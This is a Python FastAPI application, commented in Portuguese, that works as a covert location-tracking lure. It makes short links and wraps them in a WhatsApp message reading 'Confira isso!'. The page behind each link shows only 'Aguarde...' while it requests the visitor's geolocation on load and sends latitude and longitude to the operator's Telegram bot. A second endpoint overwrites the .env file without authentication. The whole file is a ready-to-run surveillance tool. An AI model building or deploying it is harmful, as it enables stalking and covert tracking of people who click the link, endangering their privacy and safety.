import uuid
from fastapi import FastAPI, Form, Request
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
from dotenv import load_dotenv
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
import requests
import os
import json

# Carregar o arquivo .env
load_dotenv()

# Acessar as variáveis de ambiente
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

app = FastAPI()

# Definir o caminho correto para os arquivos estáticos
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FRONTEND_PATH = os.path.join(BASE_DIR, "..", "frontend")

# Servir arquivos estáticos da pasta frontend
app.mount("/static", StaticFiles(directory=FRONTEND_PATH), name="static")


class LocationData(BaseModel):
    id: str
    latitude: float
    longitude: float


# Banco de dados em memória
active_links = {}


def send_to_telegram(message: str):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    params = {
        "chat_id": CHAT_ID,
        "text": message,
    }
    try:
        response = requests.post(url, data=params)
        response_data = response.json()
        if response.status_code != 200 or not response_data.get("ok"):
            print(f"Erro ao enviar mensagem para o Telegram: {response_data}")
        return response_data
    except Exception as e:
        print(f"Falha ao conectar ao Telegram: {e}")
        return {"error": str(e)}


@app.get("/")
async def serve_html():
    index_path = os.path.join(FRONTEND_PATH, "index.html")
    if not os.path.exists(index_path):
        return JSONResponse(content={"error": "Arquivo index.html não encontrado"}, status_code=404)
    return FileResponse(index_path)


@app.post("/send-location/")
async def send_location(location: LocationData):
    if location.id not in active_links:
        return JSONResponse(content={"error": "ID inválido"}, status_code=404)

    message = f"📍 Localização recebida!\n🌍 Latitude: {location.latitude}\n📍 Longitude: {location.longitude}"
    send_to_telegram(message)

    return {"message": "Localização enviada!"}


@app.get("/generate-link/")
async def generate_link():
    unique_id = str(uuid.uuid4())[:8]
    tracking_url = f"http://127.0.0.1:8000/track/{unique_id}"
    active_links[unique_id] = {"status": "waiting"}
    return JSONResponse(content={"link": tracking_url})


@app.get("/track/{tracking_id}")
async def track_user(tracking_id: str, request: Request):
    if tracking_id not in active_links:
        return JSONResponse(content={"error": "Link inválido"}, status_code=404)

    html_content = f"""
    <html>
    <head>
        <script>
            function sendLocation() {{
                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition((position) => {{
                        fetch("/send-location/", {{
                            method: "POST",
                            headers: {{"Content-Type": "application/json"}},
                            body: JSON.stringify({{
                                id: "{tracking_id}",
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude
                            }})
                        }});
                    }});
                }}
            }}
            window.onload = sendLocation;
        </script>
    </head>
    <body>
        <h1>Aguarde...</h1>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)


@app.get("/send-whatsapp/")
async def send_whatsapp():
    response = await generate_link()
    response_json = json.loads(response.body.decode("utf-8"))
    tracking_url = response_json.get("link", "")

    if not tracking_url:
        return JSONResponse(content={"error": "Falha ao gerar link"}, status_code=500)

    whatsapp_link = f"https://api.whatsapp.com/send?text=Confira isso! {tracking_url}"
    return JSONResponse(content={"whatsapp_link": whatsapp_link})


@app.get("/config")
async def config_form():
    html_content = """
    <html>
    <head><title>Configuração do Telegram Bot</title></head>
    <body>
        <h1>Configure seu bot do Telegram</h1>
        <form action="/save-config" method="post">
            <label for="telegram_token">Telegram Token:</label>
            <input type="text" id="telegram_token" name="telegram_token" required><br><br>
            <label for="chat_id">Chat ID:</label>
            <input type="text" id="chat_id" name="chat_id" required><br><br>
            <button type="submit">Salvar Configuração</button>
        </form>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)


@app.post("/save-config")
async def save_config(telegram_token: str = Form(...), chat_id: str = Form(...)):
    with open('.env', 'w') as f:
        f.write(f"TELEGRAM_TOKEN={telegram_token}\n")
        f.write(f"CHAT_ID={chat_id}\n")

    load_dotenv()

    return {"message": "Configuração salva com sucesso!"}
